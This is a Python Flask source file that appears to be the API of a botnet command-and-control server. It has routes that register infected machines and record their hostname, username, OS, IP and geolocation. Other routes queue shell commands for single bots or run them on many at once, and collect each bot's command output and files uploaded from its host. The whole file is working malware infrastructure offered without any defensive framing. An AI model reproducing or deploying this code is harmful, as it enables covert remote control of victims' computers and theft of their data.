import json
import base64
import os
from datetime import datetime
import tempfile
import shutil

from flask import Blueprint
from flask import request
from flask import abort
from flask import current_app
from flask import url_for
from flask import send_file
from flask import render_template
from werkzeug.utils import secure_filename
import pygeoip
from flask import flash
from flask import redirect
from flask import escape
import cgi

from webui import require_admin
from models import db
from models import Bot
from models import Command


api = Blueprint('api', __name__)
GEOIP = pygeoip.GeoIP('api/GeoIP.dat', pygeoip.MEMORY_CACHE)


def geolocation(ip):
    geoloc_str = 'Local'
    info = GEOIP.record_by_addr(ip)
    if info:
        geoloc_str = info['city'] + ' [' + info['country_code'] + ']'
    return geoloc_str


@api.route('/massexec', methods=['POST'])
@require_admin
def mass_execute():
    selection = request.form.getlist('selection')
    if 'execute' in request.form:
        for bot_id in selection:
            Bot.query.get(bot_id).push_command(request.form['cmd'])
        flash('Executed "%s" on %s bots' % (request.form['cmd'], len(selection)))
    elif 'delete' in request.form:
        for bot_id in selection:
            db.session.delete(Bot.query.get(bot_id))
        db.session.commit()
        flash('Deleted %s bots' % len(selection))
    return redirect(url_for('webui.bot_list'))


@api.route('/<bot_id>/push', methods=['POST'])
@require_admin
def push_command(bot_id):
    bot = Bot.query.get(bot_id)
    if not bot:
        abort(404)
    bot.push_command(request.form['cmdline'])
    return ''


@api.route('/<bot_id>/stdout')
@require_admin
def bot_console(bot_id):
    bot = Bot.query.get(bot_id)
    return render_template('bot_console.html', bot=bot)


@api.route('/<bot_id>/connect', methods=['POST'])
def get_command(bot_id):
    bot = Bot.query.get(bot_id)
    if not bot:
        bot = Bot(bot_id)
        db.session.add(bot)
        db.session.commit()
    # Report basic info about the bot
    info = request.json
    if info:
        if 'platform' in info:
            bot.operating_system = info['platform']
        if 'hostname' in info:
            bot.hostname = info['hostname']
        if 'username' in info:
            bot.username = info['username']
    bot.last_online = datetime.now()
    bot.remote_ip = request.remote_addr
    bot.geolocation = geolocation(bot.remote_ip)
    db.session.commit()
    # Return pending commands for the bot
    cmd_to_run = ''
    cmd = bot.commands.order_by(Command.timestamp.desc()).first()
    if cmd:
        cmd_to_run = cmd.cmdline
        db.session.delete(cmd)
        db.session.commit()
    return cmd_to_run


@api.route('/<bot_id>/report', methods=['POST'])
def report_command(bot_id):
    bot = Bot.query.get(bot_id)
    if not bot:
        abort(404)
    out = request.form['output']
    bot.output += cgi.escape(out)
    db.session.add(bot)
    db.session.commit()
    return ''


@api.route('/<bot_id>/upload', methods=['POST'])
def upload(bot_id):
    bot = Bot.query.get(bot_id)
    if not bot:
        abort(404)
    for file in request.files.values():
        upload_dir = os.path.join(current_app.config['UPLOAD_FOLDER'])
        bot_dir = bot_id
        store_dir = os.path.join(upload_dir, bot_dir)
        filename = secure_filename(file.filename)
        if not os.path.exists(store_dir):
            os.makedirs(store_dir)
        file_path = os.path.join(store_dir, filename)
        while os.path.exists(file_path):
            filename = "_" + filename
            file_path = os.path.join(store_dir, filename)
        file.save(file_path)
        download_link = url_for('webui.uploads', path=bot_dir + '/' + filename)
        bot.output += '[*] File uploaded: <a target="_blank" href="' + download_link + '">' + download_link + '</a>\n'
        db.session.add(bot)
        db.session.commit()
    return ''
